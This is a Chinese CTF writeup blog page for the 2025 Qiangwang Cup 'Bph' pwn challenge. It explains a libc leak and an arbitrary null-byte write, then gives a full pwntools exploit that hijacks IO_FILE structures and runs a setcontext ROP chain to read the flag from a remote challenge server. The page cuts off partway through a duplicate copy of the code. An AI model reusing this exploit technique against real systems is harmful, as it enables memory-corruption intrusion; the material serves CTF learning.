<!DOCTYPE html>
<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
        const storageKey = "theme";
        const root = document.documentElement;
        const supportsMatchMedia = typeof window.matchMedia === "function";
        const mediaQuery = supportsMatchMedia
            ? window.matchMedia("(prefers-color-scheme: dark)")
            : null;

        const readStorage = () => {
            try {
                return window.localStorage.getItem(storageKey);
            } catch (error) {
                return null;
            }
        };

        const writeStorage = (value) => {
            try {
                window.localStorage.setItem(storageKey, value);
            } catch (error) {
                return;
            }
        };

        const applyTheme = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            root.setAttribute("data-theme", theme);
            if (document.body) {
                document.body.setAttribute("data-theme", theme);
            } else {
                document.addEventListener(
                    "DOMContentLoaded",
                    () => {
                        if (document.body) {
                            document.body.setAttribute("data-theme", theme);
                        }
                    },
                    { once: true }
                );
            }
            return theme;
        };

        const updateButton = (value) => {
            const theme = value === "dark" ? "dark" : "light";
            const button = document.querySelector("[data-theme-toggle]");
            if (!button) {
                return;
            }
            const label = button.querySelector("[data-theme-toggle-label]");
            const isDark = theme === "dark";
            button.setAttribute("aria-pressed", isDark ? "true" : "false");
            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
            if (label) {
                label.textContent = isDark ? "深色" : "浅色";
            }
        };

        const stored = readStorage();
        const initial =
            stored === "light" || stored === "dark"
                ? stored
                : mediaQuery && mediaQuery.matches
                  ? "dark"
                  : "light";

        const appliedTheme = applyTheme(initial);
        updateButton(appliedTheme);

        window.__setTheme = (value) => {
            const theme = applyTheme(value);
            writeStorage(theme);
            updateButton(theme);
        };

        window.__toggleTheme = () => {
            const current =
                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
            const next = current === "dark" ? "light" : "dark";
            const theme = applyTheme(next);
            writeStorage(theme);
            updateButton(theme);
        };

        const syncButtonState = () => {
            updateButton(root.getAttribute("data-theme"));
        };

        const attachToggle = () => {
            const button = document.querySelector("[data-theme-toggle]");
            if (!button || button.__themeToggleBound) {
                return;
            }
            button.__themeToggleBound = true;
            button.addEventListener("click", (event) => {
                event.preventDefault();
                if (typeof window.__toggleTheme === "function") {
                    window.__toggleTheme();
                }
            });
        };

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", () => {
                syncButtonState();
                attachToggle();
            });
        } else {
            syncButtonState();
            attachToggle();
        }

        const handleMediaChange = (event) => {
            const storedTheme = readStorage();
            if (storedTheme === "light" || storedTheme === "dark") {
                updateButton(storedTheme);
                return;
            }
            const next = event.matches ? "dark" : "light";
            const theme = applyTheme(next);
            updateButton(theme);
        };

        if (mediaQuery) {
            if (typeof mediaQuery.addEventListener === "function") {
                mediaQuery.addEventListener("change", handleMediaChange);
            } else if (typeof mediaQuery.addListener === "function") {
                mediaQuery.addListener(handleMediaChange);
            }
        }
    })();
    if ("serviceWorker" in navigator) {
        window.addEventListener("load", () => {
            navigator.serviceWorker.register("/sw.js").catch(() => {});
        });
    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>2025 强网杯初赛 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta name="description" content="2025 强网杯初赛 Pwn 题解"/><meta property="og:title" content="2025 强网杯初赛 Writeup | 花盆"/><meta property="og:description" content="2025 强网杯初赛 Pwn 题解"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/qwb2025-qual-Writeup/README.mdx"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="preload" as="style" href="/style.css" type="text/css"/><link rel="preload" as="style" href="/fonts.css" type="text/css"/><link rel="stylesheet" href="/style.css" type="text/css"/><link rel="stylesheet" href="/fonts.css" type="text/css"/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt loading="lazy" decoding="async"/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="2025-writeup" class="scroll-target"><a href="#2025-writeup"><code class="hash inline-code">#</code>2025 强网杯初赛 Writeup</a></h1>
<h2 id="bph" class="scroll-target"><a href="#bph"><code class="hash inline-code">#</code>Bph</a></h2>
<p>乍一看是菜单堆，但是 create 只允许同时存在一个 note，edit 和 view 都是假的（只读 index），我一开始不确定是不是注册了什么 handler（但是我 ida 和 gdb 的结果都是一样的），token 函数可以在 libc/pie/stack 里三选一泄漏一个。</p>
<p>但是稍微尝试一下发现 create 时输入的 size 可以无限大，配合一开始的泄漏地址，那就相当于有了任意 libc 写 <code class="inline-code">\x00</code> 的原语。</p>
<p>这是一个很板子的<a href="https://blog.csdn.net/seaaseesa/article/details/106694651" title="https://blog.csdn.net/seaaseesa/article/details/106694651" target="_blank" rel="noopener">问题</a>，任意 libc 写 <code class="inline-code">\x00</code> 可以去打 stdin 实现二次的任意写，然后打 IOFILE 完成利用。当然最后一步也可以用 House of some 的板子一把梭。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwnlib</span><span style="color:#999999">.</span><span style="color:#393A34">tubes</span><span style="color:#999999">.</span><span style="color:#393A34">process </span><span style="color:#1E754F">import</span><span style="color:#A65E2B"> PIPE</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">terminal </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">tmux</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">splitw</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#B5695977"> '</span><span style="color:#B56959">-h</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./chall</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0">#io = process(proc, stdin=PIPE, stdout=PIPE)</span><br><span style="color:#393A34">io</span><span style="color:#999999">=</span><span style="color:#393A34">remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">8.147.130.84</span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#2F798A">28680</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc</span><span style="color:#999999">=</span><span style="color:#393A34">ELF</span><span style="color:#2993a3">(</span><span style="color:#B5695977">'</span><span style="color:#B56959">./libc.so.6</span><span style="color:#B5695977">'</span><span style="color:#2993a3">)</span><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">idx</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Choice: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">idx</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> create</span><span style="color:#2993a3">(</span><span style="color:#393A34">size</span><span style="color:#999999">,</span><span style="color:#393A34">content</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    choose</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Size: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#998418"> str</span><span style="color:#1e754f">(</span><span style="color:#393A34">size</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Content: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> content</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">payload</span><span style="color:#999999">=</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">a</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">26</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">b</span><span style="color:#B5695977">'</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendlineafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Please input your token: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">ab</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">leak </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">.</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"leak => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">leak</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_base</span><span style="color:#999999">=</span><span style="color:#393A34">leak</span><span style="color:#AB5959">-</span><span style="color:#2F798A">126</span><span style="color:#AB5959">-</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">free</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#A0ADA0">#-0x2db899</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_base => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">sleep</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><br><span style="color:#A65E2B">_IO_2_1_stdin_</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">_IO_2_1_stdin_</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#A65E2B">_IO_buf_base</span><span style="color:#999999">=</span><span style="color:#A65E2B">_IO_2_1_stdin_</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">39</span><br><span style="color:#A65E2B">_IO_list_all</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">_IO_list_all</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><br><span style="color:#393A34">stdout_addr</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">_IO_2_1_stdout_</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">fake_file_start</span><span style="color:#999999">=</span><span style="color:#A65E2B">_IO_list_all</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">500</span><br><span style="color:#393A34">sleep</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create</span><span style="color:#2993a3">(</span><span style="color:#A65E2B">_IO_buf_base</span><span style="color:#999999">,</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout_addr</span><span style="color:#1e754f">)</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">4</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">stdout_addr</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">210</span><span style="color:#1e754f">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#1e754f">(</span><span style="color:#2F798A">0</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">sleep</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload</span><span style="color:#999999">=</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stdout_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">3</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stdout_addr</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">210</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pop_rbp</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">28a91</span><br><span style="color:#393A34">magic_gadget</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">176F3E</span><span style="color:#A0ADA0"> #mov rdx,qword ptr [rax+0x38];mov rdi,rax;call qword ptr [rdx+0x20]</span><br><span style="color:#393A34">setcontext</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">setcontext</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><span style="color:#AB5959">+</span><span style="color:#2F798A">61</span><br><span style="color:#393A34">fake_file_struct </span><span style="color:#999999">=</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><br><span style="color:#999999">    </span><span style="color:#1e754f">{</span><br><span style="color:#A0ADA0">        # offset: value # field_name</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">0</span><span style="color:#999999">:</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                                             # _flags</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">8</span><span style="color:#999999">:</span><span style="color:#393A34"> pop_rbp</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                                       # _IO_read_ptr</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">10</span><span style="color:#999999">:</span><span style="color:#393A34"> fake_file_start </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">470</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 8</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                         # _IO_read_end</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">18</span><span style="color:#999999">:</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                                    # _IO_read_base</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">20</span><span style="color:#999999">:</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                                             # _IO_write_base</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">28</span><span style="color:#999999">:</span><span style="color:#2F798A"> 1</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                                             # _IO_write_ptr</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">38</span><span style="color:#999999">:</span><span style="color:#393A34"> stdout_addr</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">e0</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><br><span style="color:#A0ADA0">        # _IO_write_end (0x30) 到 _markers (0x60) 之间未设置的字段将被 flat 自动填充为0</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">68</span><span style="color:#999999">:</span><span style="color:#393A34"> magic_gadget</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                                    # _chain</span><br><span style="color:#A0ADA0">        # _fileno (0x70) 到 _shortbuf (0x83) 之间未设置的字段将被 flat 自动填充为0</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">88</span><span style="color:#999999">:</span><span style="color:#393A34"> fake_file_start </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">c30</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                             # _lock</span><br><span style="color:#A0ADA0">        # _offset (0x90) 将被 flat 自动填充为0</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">98</span><span style="color:#999999">:</span><span style="color:#393A34"> stdout_addr</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                                  # _codecvt</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">a0</span><span style="color:#999999">:</span><span style="color:#393A34"> stdout_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">48</span><span style="color:#999999">,</span><span style="color:#A0ADA0">                            # _wide_data</span><br><span style="color:#A0ADA0">        # _freeres_list (0xa8) 到 _unused2 (0xc4) 之间未设置的字段将被 flat 自动填充为0</span><br><span style="color:#AB5959">        0x</span><span style="color:#2F798A">d8</span><span style="color:#999999">:</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#a65e2b">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">_IO_wfile_jumps</span><span style="color:#B5695977">'</span><span style="color:#a65e2b">]</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#A0ADA0">  # vtable</span><br><span style="color:#999999">    </span><span style="color:#1e754f">}</span><span style="color:#999999">,</span><br><span style="color:#B07D48">    filler</span><span style="color:#999999">=</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><br><span style="color:#2993a3">)</span><br><span style="color:#393A34">pop_rax_ret</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">dd237</span><br><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">10f78b</span><br><span style="color:#393A34">pop_rsi_ret</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">110a7d</span><br><span style="color:#393A34">syscall</span><span style="color:#999999">=</span><span style="color:#393A34">libc_base</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">45539</span><br><span style="color:#393A34">payload2</span><span style="color:#999999">=</span><span style="color:#393A34">fake_file_struct</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">setcontext</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">a0</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">20</span><span style="color:#AB5959">-0x</span><span style="color:#2F798A">28</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">40</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">flag</span><span style="color:#B5695977">'</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*</span><span style="color:#2F798A">4</span><span style="color:#AB5959">+</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">'</span><span style="color:#AB5959">*0x</span><span style="color:#2F798A">8</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stdout_addr</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">160</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload2</span><span style="color:#999999">+=</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rax_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">257</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">ffffffffffffff9c</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rsi_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stdout_addr</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">e0</span><span style="color:#AB5959">+0x</span><span style="color:#2F798A">70</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">syscall</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload2</span><span style="color:#999999">+=</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rax_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rsi_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">stdout_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">syscall</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload2</span><span style="color:#999999">+=</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rax_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><span style="color:#AB5959">+</span><span style="color:#393A34">p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">syscall</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendafter</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">'</span><span style="color:#B56959">Choice: </span><span style="color:#B5695977">'</span><span style="color:#999999">,</span><span style="color:#393A34">payload2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwnlib</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">tubes</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">process </span><span style="color:#4D9375">import</span><span style="color:#C99076"> PIPE</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">terminal </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">tmux</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">splitw</span><span style="color:#C98A7D77">'</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">-h</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./chall</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">debug</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span 